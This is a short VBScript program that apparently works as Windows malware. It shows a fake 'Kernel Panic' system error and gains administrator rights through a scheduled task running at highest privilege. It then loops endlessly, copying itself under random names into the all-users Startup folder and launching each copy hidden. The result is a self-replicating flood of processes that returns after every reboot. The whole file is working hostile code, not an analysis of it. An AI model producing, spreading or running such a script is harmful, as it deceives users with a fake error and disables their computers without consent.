x=msgbox("WARNING: Major System Error, Kernel Meltdown! Major file unresponsive, reattempting..." ,16, "Kernel Panic")
Sub RunAsAdminNoUAC(remove)
'@description: Run current script as administrator. Only prompts UAC once.
'@author: Jeremy England (SimplyCoded)  
  With CreateObject("WScript.Shell")    
    If WScript.Arguments.length = 0 Then
      If .Run("schtasks /Query /FO CSV /NH /TN """ & WScript.ScriptName & """", 0, True) = 0 Then
        .Run "schtasks /Run /TN """ & WScript.ScriptName & """", 0, True
      Else
        CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & _
        WScript.ScriptFullName & """ AdminArg", "", "runas", 1
      End If
    ElseIf WScript.Arguments.Item(0) = "AdminArg" Then
      .Run "schtasks /Create /SC ONCE /TN """ & WScript.ScriptName & """ /TR ""wscript.exe \""" & _
        WScript.ScriptFullName & "\"" TaskArg"" /ST 00:01 /IT /F /RL HIGHEST", 0, True
      Exit Sub
    ElseIf WScript.Arguments.Item(0) = "TaskArg" Then
      If remove Then .Run "schtasks /Delete /TN """ & WScript.ScriptName & """ /F", 0, True : _
        .Popup "Task Deleted", 2 : WScript.Quit 
      Exit Sub  
    End If
    WScript.Quit
  End With
End Sub : RunAsAdminNoUAC(False)

For i = 1 to 10
	i = i - 1
	scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
	startupfiledirectory = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\KR4K3N" & Rnd() & ".vbs"
	Set fso = CreateObject("Scripting.FileSystemObject")
		fso.CopyFile scriptdir & "\KR4K3N.vbs", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\KR4K3N.vbs"
		fso.CopyFile scriptdir & "\KR4K3N.vbs", startupfiledirectory
	set w = CreateObject("WScript.Shell")
	w.Run chr(34) & "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\KR4K3N.vbs" & chr(34), 0
	w.Run chr(34) & startupfiledirectory & chr(34), 0
	set w= nothing
Next